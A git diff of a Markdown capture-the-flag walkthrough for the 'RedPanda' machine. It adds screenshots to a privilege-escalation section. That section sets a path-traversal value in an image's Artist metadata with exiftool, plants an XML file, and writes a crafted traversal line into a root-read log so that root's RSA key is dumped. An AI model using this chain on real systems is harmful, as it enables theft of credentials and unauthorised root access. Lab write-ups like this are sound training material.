@@ -2,7 +2,6 @@
 ## RedPanda!
 ![RedPanda](https://user-images.githubusercontent.com/99975622/205444975-3447a92f-d56f-4465-9544-52a6585c047a.png)
 
-
 ### Enumeration...
 nmap
 ![Screenshot_2022-11-20_15_38_51](https://user-images.githubusercontent.com/99975622/205445009-3f8ddebc-3c24-46b9-9fac-2c42433e57c1.png)
@@ -96,6 +95,8 @@ _**1). Add the artist metadata to a jpg file...**_
 ```
 exiftool -Artist="../tmp/author_name"  file.jpg
 ```
+![Screenshot_2022-11-20_16_29_15](https://user-images.githubusercontent.com/99975622/205459241-00dab11a-2161-4825-aa96-8128efc122b8.png)
+
 Then upload this image file to the tmp directory
 __**2). Create an xml file in the /tmp/ directory...**__
 ```
@@ -113,13 +114,31 @@ __**2). Create an xml file in the /tmp/ directory...**__
   <totalviews>2</totalviews>
 </credits>
 ```
+![Screenshot_2022-11-20_16_31_54](https://user-images.githubusercontent.com/99975622/205459255-a64fd126-cbe4-48bb-b94b-0e6cf5336f0e.png)
+
+
 Then save it as: **author_name_creds.txt
 
 __**3). Update the log file's content to match us for our expoit...**__
 ```
 echo "222||a||a||/../../../../../../tmp/file.jpg" > /opt/panda_search/redpanda.log
 ```
+Next, upload the files to the machine...
+![Screenshot_2022-11-20_16_37_25](https://user-images.githubusercontent.com/99975622/205459282-d46ff746-f373-4ab6-a950-3e0ed9a29166.png)
+
 
 After that, check the contents of the the xml file after a while, you'll see the rsa key contents dumped there....
+![Screenshot_2022-11-20_16_44_36](https://user-images.githubusercontent.com/99975622/205459292-06b63818-b111-43db-9ea8-208a322abb12.png)
+
+Now that we got the rsakey, make the nessesary file permissions change and login as root...
+![Screenshot_2022-11-20_16_51_07](https://user-images.githubusercontent.com/99975622/205459318-5a293d71-a042-44ad-bedc-c1f69dd3de37.png)
+
+And boom! 
+<br> We are Root!
+
+### Socials
+@Instagram:https://instagram.com/M3tr1c_r00t
+<br>@Twitter:https://twitter.com/M3tr1c_root
+
 
 
